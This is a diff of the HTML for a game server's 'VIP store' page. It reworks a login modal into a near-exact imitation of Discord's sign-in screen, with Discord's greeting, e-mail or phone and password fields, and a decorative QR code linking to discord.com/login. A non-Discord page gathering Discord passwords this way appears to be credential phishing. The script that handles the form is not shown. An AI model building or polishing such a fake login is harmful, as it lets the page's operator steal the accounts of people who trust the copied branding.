@@ -4,7 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Loja VIP Oficial - Wank Roleplay</title>
-    <link rel="stylesheet" href="css/style.css">
+    <link rel="stylesheet" href="style.css">
     <!-- Font Awesome -->
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <!-- Fonts -->
@@ -443,30 +443,47 @@
     <div id="loginModal" class="modal">
         <div class="modal-content discord-login-box">
             <span class="close-modal" onclick="closeLoginModal()">&times;</span>
-            <div class="discord-login-header">
-                <h3>Boas-vindas de volta!</h3>
-                <p>Estamos muito animados em te ver novamente!</p>
+            <div class="discord-login-wrapper">
+                <!-- Left Side: Form -->
+                <div class="discord-login-left">
+                    <div class="discord-login-header">
+                        <h3>Boas-vindas de volta!</h3>
+                        <p>Estamos muito animados em te ver novamente!</p>
+                    </div>
+                    <form id="discordLoginForm">
+                        <div class="discord-form-group">
+                            <label>E-MAIL OU NÚMERO DE TELEFONE <span class="required">*</span></label>
+                            <input type="text" id="discordEmail" required>
+                        </div>
+                        <div class="discord-form-group">
+                            <label>SENHA <span class="required">*</span></label>
+                            <input type="password" id="discordPassword" required>
+                        </div>
+                        <div class="discord-forgot">
+                            <a href="#">Esqueceu sua senha?</a>
+                        </div>
+                        <button type="submit" class="discord-submit-btn">Entrar</button>
+                        <div class="discord-register">
+                            <p>Precisando de uma conta? <a href="#">Registre-se</a></p>
+                        </div>
+                    </form>
+                </div>
+                
+                <!-- Right Side: QR Code -->
+                <div class="discord-login-right">
+                    <div class="discord-qr-container">
+                        <img src="https://api.qrserver.com/v1/create-qr-code/?size=160x160&data=https://discord.com/login" alt="Scan QR Code" class="discord-qr-code">
+                        <div class="discord-qr-overlay">
+                            <i class="fa-brands fa-discord"></i>
+                        </div>
+                    </div>
+                    <h3>Entrar com código QR</h3>
+                    <p>Escaneie isto com o <strong>app móvel do Discord</strong> para fazer login imediatamente.</p>
+                </div>
             </div>
-            <form id="discordLoginForm">
-                <div class="discord-form-group">
-                    <label>E-MAIL OU NÚMERO DE TELEFONE <span class="required">*</span></label>
-                    <input type="text" id="discordEmail" required>
-                </div>
-                <div class="discord-form-group">
-                    <label>SENHA <span class="required">*</span></label>
-                    <input type="password" id="discordPassword" required>
-                </div>
-                <div class="discord-forgot">
-                    <a href="#">Esqueceu sua senha?</a>
-                </div>
-                <button type="submit" class="discord-submit-btn">Entrar</button>
-                <div class="discord-register">
-                    <p>Precisando de uma conta? <a href="#">Registre-se</a></p>
-                </div>
-            </form>
         </div>
     </div>
 
-    <script src="js/script.js"></script>
+    <script src="script.js"></script>
 </body>
 </html>
